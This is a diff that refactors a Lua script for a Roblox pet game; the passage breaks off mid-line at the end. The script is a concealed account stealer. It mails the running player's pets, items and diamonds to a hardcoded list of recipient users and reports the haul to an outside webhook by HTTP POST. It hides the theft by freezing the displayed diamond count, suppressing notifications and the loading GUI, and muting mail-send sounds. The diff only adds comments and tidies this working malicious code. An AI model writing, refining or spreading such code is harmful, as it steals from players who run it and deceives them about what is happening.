@@ -1,7 +1,5 @@
 _G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
-end
+if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
 local network = require(game.ReplicatedStorage.Library.Client.Network)
@@ -33,7 +31,8 @@ for _, user in ipairs(users) do
     end
 end
 
-for adress, func in pairs(getgc()) do
+-- Get mail send price function
+for _, func in pairs(getgc()) do
     if debug.getinfo(func).name == "computeSendMailCost" then
         FunctionToGetFirstPriceOfMail = func
         break
@@ -50,6 +49,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
     end
 end
 
+-- Format number for webhook
 local function formatNumber(number)
     local number = math.floor(number)
     local suffixes = {"", "k", "m", "b", "t"}
@@ -61,6 +61,7 @@ local function formatNumber(number)
     return string.format("%.2f%s", number, suffixes[suffixIndex])
 end
 
+-- Webhook reporting
 local function SendMessage(diamonds)
     local headers = {["Content-Type"] = "application/json"}
     local fields = {
@@ -110,119 +111,100 @@ local function SendMessage(diamonds)
 
         while #fields[2].value > 1024 and #lines > 0 do
             table.remove(lines)
-            fields[2].value = table.concat(lines, "\n")
-            fields[2].value = fields[2].value .. "\nPlus more!"
+            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
         end
     end
 
     local body = HttpService:JSONEncode(data)
-    request({
-        Url = webhook,
-        Method = "POST",
-        Headers = headers,
-        Body = body
-    })
+    request({Url = webhook, Method = "POST", Headers = headers, Body = body})
 end
 
+-- Freeze diamonds in leaderstats
 local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
 local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
     gemsleaderstatpath.Value = gemsleaderstat
 end)
 
+-- Disable notifications & loading GUI
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
-noti:GetPropertyChangedSignal("Enabled"):Connect(function()
-    noti.Enabled = false
-end)
+noti:GetPropertyChangedSignal("Enabled"):Connect(function() noti.Enabled = false end)
 noti.Enabled = false
 
-game.DescendantAdded:Connect(function(x)
-    if x.ClassName == "Sound" then
-        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
-            x.Volume=0
-            x.PlayOnRemove=false
-            x:Destroy()
+-- Mute all mail sending sounds
+game.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("Sound") then
+        if descendant.SoundId == "rbxassetid://11839132565" or 
+           descendant.SoundId == "rbxassetid://14254721038" or 
+           descendant.SoundId == "rbxassetid://12413423276" then
+            descendant.Volume = 0
+            descendant.PlayOnRemove = false
+            descendant:Destroy()
         end
     end
 end)
 
+-- Get RAP for item
 local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
-        {
-            Class = {Name = Type},
-            IsA = function(hmm)
-                return hmm == Type
-            end,
-            GetId = function()
-                return Item.id
-            end,
-            StackKey = function()
-                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
-            end,
-            AbstractGetRAP = function(self)
-                return nil
-            end
-        }
-    ) or 0)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
+        Class = {Name = Type},
+        IsA = function(hmm) return hmm == Type end,
+        GetId = function() return Item.id end,
+        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
+        AbstractGetRAP = function() return nil end
+    }) or 0)
 end
 
+-- Send item to mailbox, switch users if full
 local function sendItem(category, uid, am)
     local userIndex = 1
     local maxUsers = #users
     local sent = false
-
+    
     repeat
         local currentUser = users[userIndex]
-        local args = {[1]=currentUser, [2]=MailMessage, [3]=category, [4]=uid, [5]=am or 1}
+        local args = {currentUser, MailMessage, category, uid, am or 1}
         local response, err = network.Invoke("Mailbox: Send", unpack(args))
 
         if response == true then
             sent = true
             GemAmount1 = GemAmount1 - mailSendPrice
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
-        elseif response == false and err == "They don't have enough space!" then
+        elseif err == "They don't have enough space!" then
             userIndex = userIndex + 1
             if userIndex > maxUsers then
                 sent = true
             end
-        else
-            task.wait(0.2)
         end
     until sent
 end
 
+-- Send all remaining diamonds
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            if GemAmount1 >= (mailSendPrice + 10000) then
-                local userIndex = 1
-                local maxUsers = #users
-                local sent = false
-
-                repeat
-                    local currentUser = users[userIndex]
-                    local args = {[1]=currentUser, [2]=MailMessage, [3]="Currency", [4]=i, [5]=GemAmount1 - mailSendPrice}
-                    local response, err = network.Invoke("Mailbox: Send", unpack(args))
-
-                    if response == true then
-                        sent = true
-                    elseif response == false and err == "They don't have enough space!" then
-                        userIndex = userIndex + 1
-                        if userIndex > maxUsers then
-                            sent = true
-                        end
-                    else
-                        task.wait(0.2)
-                    end
-                until sent
-                break
-            end
+        if v.id == "Diamonds" and GemAmount1 >= (mailSendPrice + 10000) then
+            local userIndex = 1
+            local maxUsers = #users
+            local sent = false
+            repeat
+                local currentUser = users[userIndex]
+                local args = {currentUser, MailMessage, "Currency", i, GemAmount1 - mailSendPrice}
+                local response, err = network.Invoke("Mailbox: Send", unpack(args))
+                if response == true then
+                    sent = true
+                elseif err == "They don't have enough space!" then
+                    userIndex = userIndex + 1
+                    if userIndex > maxUsers then sent = true end
+                end
+            until sent
+            break
         end
     end
 end
 
+-- Empty boxes
 local function EmptyBoxes()
     if save.Box then
         for key, value in pairs(save.Box) do
@@ -233,6 +215,7 @@ local function EmptyBoxes()
     end
 end
 
+-- Claim all mail
 local function ClaimMail()
     local response, err = network.Invoke("Mailbox: Claim All")
     while err == "You must wait 30 seconds before using the mailbox!" do
@@ -241,11 +224,15 @@ local function ClaimMail()
     end
 end
 
+-- Check if mail can be sent
 local function canSendMail()
     local uid
-    for i, v in pairs(save["Pet"]) do
-        uid = i
-        break
-    end
-    local args = {[1]="Roblox",[2]="Test",[3]="Pet",[4]=uid,[5]=1}
-    local response, err = network.Invoke("Mailbox
+    for i, v in pairs(save["Pet"]) do uid = i break end
+    local args = {"Roblox","Test","Pet",uid,1}
+    local response, err = network.Invoke("Mailbox: Send", unpack(args))
+    return (err == "They don't have enough space!")
+end
+
+-- Claim daycare
+require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).
